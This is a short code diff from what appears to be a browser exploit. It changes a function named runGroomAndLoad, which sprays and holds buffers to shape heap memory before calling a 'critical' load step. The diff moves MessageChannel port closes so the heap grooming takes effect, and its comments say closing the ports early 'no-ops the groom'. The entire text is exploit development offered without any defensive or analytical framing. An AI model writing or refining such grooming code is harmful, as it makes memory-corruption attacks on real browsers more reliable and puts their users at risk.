@@ -1042,8 +1042,10 @@ function runGroomAndLoad() {
     try {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
-        channel.port1.close();
-        channel.port2.close();
+        
+        // FIX: Do NOT close the ports before posting. 
+        // Closing them early ignores the transfer list and no-ops the groom.
+        // We will close them after the final postMessage.
 
         for (let i = 0; i < DRAIN_COUNT; ++i)
             keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
@@ -1082,6 +1084,11 @@ function runGroomAndLoad() {
                 + "," + earlyHole.byteLength
                 + "," + finalHole.byteLength);
         }
+
+        // FIX: Now that all transfers are queued, we can safely close the ports.
+        // This ensures the transfer list is processed by the message queue.
+        channel.port1.close();
+        channel.port2.close();
 
         loadHistoryCritical();
     } catch (error) {
